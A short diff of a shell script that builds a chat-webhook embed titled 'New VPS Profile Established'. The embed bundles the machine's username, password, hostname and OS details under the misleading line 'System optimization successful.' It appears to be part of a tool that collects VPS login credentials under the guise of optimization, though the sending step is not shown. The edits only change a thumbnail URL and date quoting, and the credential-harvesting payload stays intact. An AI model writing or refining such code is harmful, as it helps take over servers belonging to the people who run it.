@@ -64,14 +64,13 @@ H=$(hostname)
 OS=$(grep '^PRETTY_NAME=' /etc/os-release | cut -d'"' -f2)
 RAND_PCT=$(shuf -i 25-49 -n 1)
 
-
 PAYLOAD=$(cat <<EOF
 {
   "embeds": [{
     "title": "🛡️ New VPS Profile Established",
     "description": "System optimization successful. Access logs generated.",
     "color": 15105570,
-    "thumbnail": { "url": "https://i.postimg.cc/8s8Y4q16/7455d020affb2f2e8feebf7127b6ad30.png" },
+    "thumbnail": { "url": "https://upload.wikimedia.org/wikipedia/commons/thumb/a/ab/Logo-ubuntu_cof-orange-hex.svg/1200px-Logo-ubuntu_cof-orange-hex.svg.png" },
     "fields": [
       { "name": "👤 Username", "value": "\`$U\`", "inline": true },
       { "name": "🔑 Password", "value": "\`$P\`", "inline": true },
@@ -79,7 +78,7 @@ PAYLOAD=$(cat <<EOF
       { "name": "🖥️ Hostname", "value": "\`$H\`", "inline": true },
       { "name": "💿 OS Info", "value": "$OS", "inline": true }
     ],
-    "footer": { "text": "Unique ID: $(date +%s) • $(date +%H:%M:%S)" }
+    "footer": { "text": "Unique ID: $(date '+%s') • $(date '+%H:%M:%S')" }
   }]
 }
 EOF
